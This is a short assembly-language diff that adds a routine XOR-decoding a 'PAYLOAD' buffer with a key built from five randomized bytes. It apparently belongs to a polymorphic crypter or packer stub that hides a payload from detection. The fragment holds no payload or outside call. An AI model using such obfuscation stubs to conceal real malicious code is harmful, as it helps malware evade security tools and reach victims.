@@ -4,6 +4,28 @@
 %define V_ROWCNT EBP-((0x04*4)+RANDOMs)
 %define V_BBDCIPH EBP-((0x04*5)+RANDOMs)
 
+
+; ### DeXor the BB key
+_bbdxor:
+  mov bl,RANDOMK1
+  xor bl,RANDOMK2
+  xor bl,RANDOMK3
+  xor bl,RANDOMK4
+  xor bl,RANDOMK5
+  mov ecx,[BBLEN]
+  mov esi,[PAYLOAD]
+  mov edi,esi
+.lbbdxor
+  
+  lodsb 
+  xor al,bl
+  stosb
+  loop  .lbbdxor
+  
+  ret
+
+
+
 _bbdecypher:
 	push 	ebp
 	mov	ebp,esp
